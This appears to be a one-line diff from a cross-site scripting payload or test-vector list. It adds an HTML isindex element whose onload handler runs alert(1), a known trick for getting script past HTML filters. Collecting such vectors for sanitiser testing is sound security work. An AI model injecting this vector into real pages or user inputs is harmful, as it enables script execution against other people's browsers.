@@ -1,0 +1,1 @@
+<isindex type=image onload=alert(1) src=validimage.png>
